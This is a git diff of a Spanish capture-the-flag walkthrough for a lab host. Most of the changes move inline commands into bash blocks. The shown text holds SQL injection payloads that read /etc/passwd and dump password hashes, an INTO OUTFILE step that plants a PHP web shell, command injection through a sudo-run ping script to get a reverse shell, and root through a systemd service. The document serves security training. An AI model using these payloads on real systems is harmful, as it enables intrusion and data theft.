@@ -59,7 +59,15 @@ nmap -sC -sV -p22,80,64999, 10.10.10.143 -oN targeted
 whatweb http://10.10.10.143
 ```
 
-Vemos un dominio `logger.htb` pero poco mas. Añadimo el dominio a nuestro `/etc/hosts`
+Vemos un dominio 
+```bash
+ logger.htb 
+```
+ pero poco mas. Añadimo el dominio a nuestro 
+```bash
+ /etc/hosts 
+```
+
 
 #### http-enum {-}
 
@@ -69,12 +77,20 @@ Lanzamos un web scan con nmap.
 nmap --script http-enum -p80 10.10.10.143 -oN webScan
 ```
 
-Vemos que hay un `/phpmyadmin`
+Vemos que hay un 
+```bash
+ /phpmyadmin 
+```
+
 
 #### Analyzando la web con Firefox {-}
 
 Es una web de un hotel donde se puede hacer reservaciones. Cuando miramos mas en profundidad, nos damos cuenta de algo que nos 
-llama la atencion `http://10.10.10.143/room.php?cod=6`
+llama la atencion 
+```bash
+ http://10.10.10.143/room.php?cod=6 
+```
+
 
 Si cambiamos el **cod** con numeros invalidos vemos que intenta mostrarnos algo sin mensajes de error. Vamos a comprobar si esta
 vulnerable a injeccion SQL## Vulnerability Assessment {-}
@@ -120,8 +136,20 @@ http://10.10.10.143/room.php?cod=-1 union select 1,2,user(),4,5,6,7 -- -
 http://10.10.10.143/room.php?cod=-1 union select 1,2,load_file("/etc/passwd"),4,5,6,7 -- -
 ```
 
-> [ ! ] NOTAS: Si la web no deja incorporar String como en el methodo load_file, se puede transformar el String `/etc/passwd` en hexadecimal y colocarlo ahi. Haciendo
-un `echo "/etc/passwd" | tr -d '\n' | xxd -ps` -> 2f6574632f706173737764 y ponerlo en la web `1,2,load_file(0x2f6574632f706173737764),4,5,6,7`
+> [ ! ] NOTAS: Si la web no deja incorporar String como en el methodo load_file, se puede transformar el String 
+```bash
+ /etc/passwd 
+```
+ en hexadecimal y colocarlo ahi. Haciendo
+un 
+```bash
+ echo "/etc/passwd" | tr -d '\n' | xxd -ps 
+```
+ -> 2f6574632f706173737764 y ponerlo en la web 
+```bash
+ 1,2,load_file(0x2f6574632f706173737764),4,5,6,7 
+```
+
 
 Aqui vemos que tenemos capacidad de lectura sobre ficheros internos passando por la Injeccion SQL. Continuamos
 
@@ -167,7 +195,11 @@ http://10.10.10.143/room.php?cod-1 union select 1,2,group_concat(User,0x3A,Passw
 Vemos que existe el usuario DBAdmin con un hash de contraseña, si tiramos de Rainbow Tables como [CrackStation](https://crackstation.net/) vemos la contraseña
 en texto claro.
 
-Teniendo esto en cuenta, podriamos aprovechar de connectarnos a la routa `/phpmyadmin/` para lanzar commandos.
+Teniendo esto en cuenta, podriamos aprovechar de connectarnos a la routa 
+```bash
+ /phpmyadmin/ 
+```
+ para lanzar commandos.
 
 
 #### Using SQL Injection para crear ficheros {-}
@@ -180,7 +212,11 @@ http://10.10.10.143/room.php?cod-1 union select 1,2,"Hola esto es una prueba",4,
 ```
 
 Aqui intentamos crear un fichero prueba.txt que creamos en una de las routas mas communes, y si lanzamos el commando y que navegamos por 
-`http://10.10.10.143/prueba.txt` vemos el contenido.
+
+```bash
+ http://10.10.10.143/prueba.txt 
+```
+ vemos el contenido.
 
 ```bash
 http://10.10.10.143/room.php?cod-1 union select 1,2,"<?php system('whoami'); ?>",4,5,6,7 into outfile "/var/www/html/prueba.php" -- -
@@ -188,7 +224,11 @@ http://10.10.10.143/room.php?cod-1 union select 1,2,"<?php system('whoami'); ?>"
 
 Aqui vemos www-data como usuario. Vamos a intentar ganar accesso al systema.
 
-> [ ! ] NOTAS: todo esto se podria hacer de la misma manera desde el panel `phpmyadmin`
+> [ ! ] NOTAS: todo esto se podria hacer de la misma manera desde el panel 
+```bash
+ phpmyadmin 
+```
+
 
 ## Vuln exploit & Gaining Access {-}
 
@@ -206,7 +246,11 @@ Aqui vemos www-data como usuario. Vamos a intentar ganar accesso al systema.
     http://10.10.10.143/room.php?cod-1 union select 1,2,"<?php system($_REQUEST['cmd']); ?>",4,5,6,7 into outfile "/var/www/html/s4vishell.php" -- -
     ```
 
-1. Vamos a la pagina `http://10.10.10.143/s4vishell.php`
+1. Vamos a la pagina 
+```bash
+ http://10.10.10.143/s4vishell.php 
+```
+
 1. Probamos commandos
 
     ```bash
@@ -289,7 +333,15 @@ if __name__ == '__main__':
 
 ### User pivoting al usuario pepper {-}
 
-Hemos podido comprobar que no podiamos leer el fichero `user.txt` siendo el usuario `www-data`. Tendremos que convertirnos en el usuario
+Hemos podido comprobar que no podiamos leer el fichero 
+```bash
+ user.txt 
+```
+ siendo el usuario 
+```bash
+ www-data 
+```
+. Tendremos que convertirnos en el usuario
 **pepper** antes de intentar rootear la maquina.
 
 ```bash
@@ -297,12 +349,28 @@ id
 sudo -l
 ```
 
-Aqui vemos que podemos ejecutar el script `/var/www/Admin-Utilities/simpler.py` como el usuario **pepper** sin proporcinar contraseña.
+Aqui vemos que podemos ejecutar el script 
+```bash
+ /var/www/Admin-Utilities/simpler.py 
+```
+ como el usuario **pepper** sin proporcinar contraseña.
 
-Si lanzamos el script con el commando `sudo -u pepper /var/www/Admin-Utilities/simpler.py` vemos que es una utilidad que lanza un ping a maquinas
-definidas por el commando `-p`.
+Si lanzamos el script con el commando 
+```bash
+ sudo -u pepper /var/www/Admin-Utilities/simpler.py 
+```
+ vemos que es una utilidad que lanza un ping a maquinas
+definidas por el commando 
+```bash
+ -p 
+```
+.
 
-si nos ponemos en escucha por trazas **ICMP** con el commando `tcpdump -i tun0 icmp -n` y que lanzamos el script:
+si nos ponemos en escucha por trazas **ICMP** con el commando 
+```bash
+ tcpdump -i tun0 icmp -n 
+```
+ y que lanzamos el script:
 
 ```bash
 sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
@@ -322,7 +390,11 @@ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
 
 Aqui tambien recibimos la traza **ICMP** lo que significa que el programa interpreta codigo.
 
-Si nos ponemos en escucha por el puerto 443 con `nc -nlvp 443` y que le ponemos
+Si nos ponemos en escucha por el puerto 443 con 
+```bash
+ nc -nlvp 443 
+```
+ y que le ponemos
 
 ```bash
 sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
@@ -331,9 +403,17 @@ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
 ```
 
 No funcciona. Si miramos el codigo fuente de script en python, vemos que hay caracteres que son considerados como invalidos.
-Uno de ellos es el `-`
+Uno de ellos es el 
+```bash
+ - 
+```
 
-Decidimos crearnos un fichero `reverse.sh`
+
+Decidimos crearnos un fichero 
+```bash
+ reverse.sh 
+```
+
 
 ```bash
 cd /tmp
@@ -398,7 +478,11 @@ cd privesc
 cp /tmp/reverse.sh privesc.sh
 ```
 
-Aqui nos vamos a crear un systemctl service file -> `nano privesc.service`
+Aqui nos vamos a crear un systemctl service file -> 
+```bash
+ nano privesc.service 
+```
+
 
 ```bash
 [Unit]
@@ -430,4 +514,8 @@ WantedBy=multi-user.target
     ```
 
 
-`whoami` -> root ;)
+
+```bash
+ whoami 
+```
+ -> root ;)
